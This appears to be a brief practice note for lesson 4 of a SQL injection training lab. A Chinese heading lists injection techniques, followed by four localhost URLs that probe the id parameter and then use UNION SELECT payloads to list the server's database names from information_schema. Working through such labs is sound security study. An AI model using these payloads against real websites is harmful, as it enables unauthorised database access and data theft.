# Lesson-04
```
明注-,-Bool盲注-,-时间盲注-,-报错注入
```

```
http://127.0.0.1/Less-4/?id=1
http://127.0.0.1/Less-4/?id=1%22
http://127.0.0.1/Less-4/?id=0%22)%20union%20select%201,2,3--+
http://127.0.0.1/Less-4/?id=0%22)%20union%20select%201,group_concat(schema_name),2%20from%20information_schema.schemata--+
```
